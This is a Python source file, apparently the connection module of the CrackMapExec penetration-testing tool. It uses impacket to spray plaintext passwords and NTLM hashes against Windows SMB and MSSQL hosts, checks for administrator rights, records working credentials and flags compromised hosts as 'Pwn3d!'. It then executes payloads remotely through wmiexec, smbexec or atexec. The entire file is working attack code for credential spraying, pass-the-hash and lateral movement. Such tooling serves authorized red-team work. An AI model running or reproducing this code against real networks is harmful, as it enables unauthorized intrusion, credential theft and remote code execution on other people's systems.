from traceback import format_exc
from helpers import highlight
from cme.execmethods.mssqlexec import MSSQLEXEC
from cme.execmethods.wmiexec import WMIEXEC
from cme.execmethods.smbexec import SMBEXEC
from cme.execmethods.atexec import TSCH_EXEC
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.smbconnection import SessionError

class Connection:

    def __init__(self, args, db, target, server_name, domain, conn, logger, cmeserver):
        self.args = args
        self.db = db
        self.host = target
        self.hostname = server_name
        self.domain = domain
        self.conn = conn
        self.logger = logger
        self.cmeserver = cmeserver
        self.password = None
        self.username = None
        self.hash = None
        self.admin_privs = False

        self.login()

    def check_if_admin(self):
        if self.args.mssql:
            try:
                #I'm pretty sure there has to be a better way of doing this.
                #Currently we are just searching for our user in the sysadmin group

                self.conn.sql_query("EXEC sp_helpsrvrolemember 'sysadmin'")
                query_output = self.conn.printRows()
                if query_output.find('{}\\{}'.format(self.domain, self.username)) != -1:
                    self.admin_privs = True
            except:
                pass

        elif not self.args.mssql:
            '''
                We use the OpenSCManagerW Win32API call to to establish a handle to the remote host. 
                If this succeeds, the user context has administrator access to the target.

                Idea stolen from PowerView's Invoke-CheckLocalAdminAccess
            '''

            stringBinding = r'ncacn_np:{}[\pipe\svcctl]'.format(self.host)

            rpctransport = transport.DCERPCTransportFactory(stringBinding)
            rpctransport.set_dport(self.args.smb_port)

            lmhash = ''
            nthash = ''
            if self.hash:
                if self.hash.find(':') != -1:
                    lmhash, nthash = self.hash.split(':')
                else:
                    nthash = self.hash

            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.username, self.password if self.password is not None else '', self.domain, lmhash, nthash)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            lpMachineName = '{}\x00'.format(self.host)
            try:

                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx

                resp = scmr.hROpenSCManagerW(dce, lpMachineName, 'ServicesActive\x00', 0xF003F)
                self.admin_privs = True
            except DCERPCException:
                pass

    def plaintext_login(self, username, password):
        try:
            if self.args.mssql:
                res = self.conn.login(None, username, password, self.domain, None, True)
                if res is not True:
                    self.conn.printReplies()
                    return False
            
            elif not self.args.mssql:
                self.conn.login(username, password, self.domain)

            self.password = password
            self.username = username
            self.check_if_admin()
            self.db.add_credential('plaintext', self.domain, username, password)

            if self.admin_privs:
                self.db.link_cred_to_host('plaintext', self.domain, username, password, self.host)

            out = u'{}\\{}:{} {}'.format(self.domain.decode('utf-8'),
                                         username.decode('utf-8'),
                                         password.decode('utf-8'),
                                         highlight('(Pwn3d!)') if self.admin_privs else '')

            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{}:{} {} {}'.format(self.domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        password.decode('utf-8'),
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))
            return False

    def hash_login(self, username, ntlm_hash):
        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash

        try:
            if self.args.mssql:
                res = self.conn.login(None, username, '', self.domain, ntlm_hash, True)
                if res is not True:
                    self.conn.printReplies()
                    return False

            elif not self.args.mssql:
                self.conn.login(username, '', self.domain, lmhash, nthash)

            self.hash = ntlm_hash
            self.username = username
            self.check_if_admin()
            self.db.add_credential('hash', self.domain, username, ntlm_hash)

            if self.admin_privs:
                self.db.link_cred_to_host('hash', self.domain, username, ntlm_hash, self.host)

            out = u'{}\\{} {} {}'.format(self.domain.decode('utf-8'), 
                                         username.decode('utf-8'), 
                                         ntlm_hash, 
                                         highlight('(Pwn3d!)') if self.admin_privs else '')

            self.logger.success(out)
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{} {} {} {}'.format(self.domain.decode('utf-8'),
                                                        username.decode('utf-8'),
                                                        ntlm_hash,
                                                        error,
                                                        '({})'.format(desc) if self.args.verbose else ''))
            return False

    def login(self):
        if self.args.local_auth:
            self.domain = self.hostname

        for user in self.args.username:

            if type(user) is file:

                for usr in user:

                    if self.args.hash:
                        for ntlm_hash in self.args.hash:
                            if type(ntlm_hash) is not file:
                                if self.hash_login(usr.strip(), ntlm_hash): return
                            
                            elif type(ntlm_hash) is file:
                                for f_hash in ntlm_hash:
                                    if self.hash_login(usr.strip(), f_hash.strip()): return

                    elif self.args.password:
                        for password in self.args.password:
                            if type(password) is not file:
                                if self.plaintext_login(usr.strip(), password): return
                            
                            elif type(password) is file:
                                for f_pass in password:
                                    if self.plaintext_login(usr.strip(), f_pass.strip()): return

            elif type(user) is not file:

                    if self.args.hash:
                        for ntlm_hash in self.args.hash:
                            if type(ntlm_hash) is not file:
                                if self.hash_login(user, ntlm_hash): return
                            
                            elif type(ntlm_hash) is file:
                                for f_hash in ntlm_hash:
                                    if self.hash_login(user, f_hash.strip()): return

                    elif self.args.password:
                        for password in self.args.password:
                            if type(password) is not file:
                                if self.plaintext_login(user, password): return
                            
                            elif type(password) is file:
                                for f_pass in password:
                                    if self.plaintext_login(user, f_pass.strip()): return

    def execute(self, payload, get_output=False, method=None):

        if self.args.mssql:
            exec_method = MSSQLEXEC(self.conn) 
        
        elif not self.args.mssql:

            if not method and not self.args.exec_method:
                try:
                    exec_method = WMIEXEC(self.host, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)
                except:
                    if self.args.verbose:
                        self.logger.debug('Error executing command via wmiexec, traceback:')
                        self.logger.debug(format_exc())

                    try:
                        exec_method = SMBEXEC(self.host, self.args.smb_port, self.username, self.password, self.domain, self.hash, self.args.share)
                    except:
                        if self.args.verbose:
                            self.logger.debug('Error executing command via smbexec, traceback:')
                            self.logger.debug(format_exc())

                        try:
                            exec_method = TSCH_EXEC(self.host, self.username, self.password, self.domain, self.hash) #self.args.share)
                        except:
                            if self.args.verbose:
                                self.logger.debug('Error executing command via atexec, traceback:')
                                self.logger.debug(format_exc())
                            return

            elif method or self.args.exec_method:

                if not method:
                    method = self.args.exec_method

                if method == 'wmiexec':
                    exec_method = WMIEXEC(self.host, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)

                elif method == 'smbexec':
                    exec_method = SMBEXEC(self.host, self.args.smb_port, self.username, self.password, self.domain, self.hash, self.args.share)

                elif method == 'atexec':
                    exec_method = TSCH_EXEC(self.host, self.username, self.password, self.domain, self.hash) #self.args.share)

        if self.cmeserver:
            if hasattr(self.cmeserver.server.module, 'on_request') or hasattr(self.cmeserver.server.module, 'on_response'):
                self.cmeserver.server.hosts.append(self.host)

        output = exec_method.execute(payload, get_output)

        return u'{}'.format(output.strip().decode('utf-8'))
